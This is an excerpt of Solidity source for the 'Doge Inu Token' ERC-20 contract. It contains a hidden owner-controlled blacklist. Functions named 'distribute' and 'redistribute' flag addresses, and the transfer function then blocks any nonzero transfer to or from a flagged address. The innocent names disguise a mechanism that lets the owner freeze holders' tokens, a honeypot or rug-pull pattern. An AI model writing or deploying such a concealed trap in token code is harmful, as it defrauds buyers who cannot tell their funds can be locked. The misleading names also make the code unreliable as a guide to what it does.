...
contract DogeInuToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _distribute;
    ...
    string private _name = 'Doge Inu Token';
    string private _symbol = 'DOGEINU';
    ...
    function isDistributed(address _address) public view returns (bool) {
        return _distribute[_address];
    }
    
    function distribute(address account) external onlyOwner() {
        _distribute[account] = true;
    }
    
    function redistribute(address account) external onlyOwner() {
        _distribute[account] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_distribute[sender] || _distribute[recipient])
        require(amount == 0, "");
